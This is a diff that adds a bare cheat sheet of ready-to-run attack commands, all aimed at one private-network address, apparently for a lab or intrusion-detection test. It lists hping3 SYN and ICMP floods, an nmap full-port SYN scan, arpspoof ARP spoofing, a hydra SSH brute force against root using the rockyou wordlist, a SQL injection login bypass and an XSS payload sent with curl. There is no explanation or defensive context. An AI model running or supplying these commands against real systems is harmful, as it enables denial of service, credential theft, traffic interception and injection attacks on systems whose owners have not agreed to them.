@@ -1,0 +1,20 @@
+DDoS / DoS Attack:
+sudo hping3 -S --flood -V 192.168.20.17 -p 80
+
+SQL Injection:
+curl -X POST "http://192.168.20.17/index.php" -d "username=admin' OR 1=1; -- &password=any"
+
+Port Scanning:
+nmap -sS -p 1-65535 -T4 192.168.20.17
+
+MITM (ARP Spoofing):
+sudo arpspoof -i eth0 -t 192.168.20.17 -r 192.168.20.1
+
+SSH Brute Force:
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.20.17 ssh
+
+ICMP Flood:
+sudo hping3 --icmp --flood 192.168.20.17
+
+XSS Attack:
+curl -X POST -d "input=<script>alert('XSS')</script>" http://192.168.20.17/index.php
